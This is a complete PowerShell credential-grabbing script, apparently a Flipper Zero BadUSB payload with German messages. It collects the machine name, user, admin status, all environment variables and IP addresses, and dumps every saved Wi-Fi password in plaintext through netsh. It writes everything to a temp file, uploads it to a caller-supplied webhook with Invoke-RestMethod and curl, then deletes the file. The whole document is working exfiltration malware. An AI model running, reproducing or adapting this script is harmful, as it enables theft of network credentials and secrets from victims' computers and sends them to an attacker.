
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [string]$Webhook,

    [switch]$KeepFile
)

$ErrorActionPreference = 'Continue'

if ([string]::IsNullOrWhiteSpace($Webhook)) {
    Write-Warning 'Kein Webhook uebergeben.'
    exit 1
}

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
try { [Console]::OutputEncoding = [Text.Encoding]::GetEncoding((Get-Culture).TextInfo.OEMCodePage) } catch {}

$out   = Join-Path $env:TEMP ("stats_{0}.txt" -f ([guid]::NewGuid().ToString('N').Substring(0, 8)))
$lines = New-Object 'System.Collections.Generic.List[string]'
$isAdm = (New-Object Security.Principal.WindowsPrincipal(
            [Security.Principal.WindowsIdentity]::GetCurrent())
         ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$lines.Add("host : $env:COMPUTERNAME")
$lines.Add("user : $env:USERDOMAIN\$env:USERNAME")
$lines.Add("admin: $isAdm")

$lines.Add(''); $lines.Add('=== ENV ===')
Get-ChildItem env: | Sort-Object Name | ForEach-Object { $lines.Add(('{0}={1}' -f $_.Name, $_.Value)) }

$lines.Add(''); $lines.Add('=== IP ===')
Get-NetIPAddress |
    Where-Object { $_.IPAddress -notmatch '^(127\.0\.0\.1|169\.254\.\d+\.\d+)' } |
    Sort-Object InterfaceAlias |
    ForEach-Object { $lines.Add(('{0,-20} {1,-12} {2}' -f $_.IPAddress, $_.SuffixOrigin, $_.InterfaceAlias)) }

$lines.Add(''); $lines.Add('=== WLAN ===')
$profiles = @(
    netsh wlan show profiles |
        Where-Object { $_ -match '(Alle Benutzerprofile|All User Profile)\s*:\s*(.+)$' } |
        ForEach-Object { $_.Split(':', 2)[1].Trim() }
)

if ($profiles.Count -eq 0) {
    $lines.Add('<keine Profile gefunden>')
}
else {
    foreach ($p in $profiles) {
        $hit = netsh wlan show profile name="$p" key=clear |
               Where-Object { $_ -match '(Sch.sselinhalt|Key Content)\s*:\s*(.+)$' }
        $pw  = if ($hit) { $hit.Split(':', 2)[1].Trim() } else { '<kein Key / nicht lesbar>' }
        $lines.Add(('{0,-34} {1}' -f $p, $pw))
    }
}

[IO.File]::WriteAllText($out, ($lines -join "`r`n"), (New-Object Text.UTF8Encoding($false)))

$ok = $true
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -ContentType 'application/json' -ErrorAction Stop `
        -Body (@{ content = "grab von flipper - $env:COMPUTERNAME ($env:USERNAME)" } | ConvertTo-Json)
}
catch {
    $ok = $false
    Write-Warning "JSON-Post fehlgeschlagen: $($_.Exception.Message)"
}

$curl = Get-Command curl.exe -ErrorAction SilentlyContinue
if ($curl) {
    & $curl.Source -s -F "file=@$out;type=text/plain" $Webhook
    if ($LASTEXITCODE -ne 0) { $ok = $false; Write-Warning "Upload fehlgeschlagen (curl exit $LASTEXITCODE)" }
}
else {
    $ok = $false
    Write-Warning 'curl.exe nicht vorhanden'
}

if ($ok -and -not $KeepFile) { Remove-Item $out -Force }
else { Write-Host "Datei behalten: $out" }
